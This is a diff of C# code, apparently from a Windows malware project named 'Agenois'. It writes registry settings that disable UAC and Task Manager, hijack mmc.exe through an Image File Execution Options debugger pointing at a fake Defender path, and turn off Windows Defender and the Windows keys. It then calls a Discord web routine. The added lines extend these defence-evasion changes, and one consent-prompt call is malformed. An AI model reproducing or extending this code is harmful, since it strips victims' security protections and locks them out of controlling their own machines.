@@ -58,7 +58,7 @@ namespace Agenois
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                 editKey.Close();
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                editKey.SetValue("DisableTaskMgr", "1");
+                editKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                 editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
@@ -176,6 +176,16 @@ namespace Agenois
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
+                editKey.Close();
+                
+                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
+                editKey.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoWinkeys", "1", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\ConsentPromptBehaviorAdmin");
+                editKey.SetValue("0", RegistryValueKind.DWord);
                 editKey.Close();
 
                 Web.Discord();
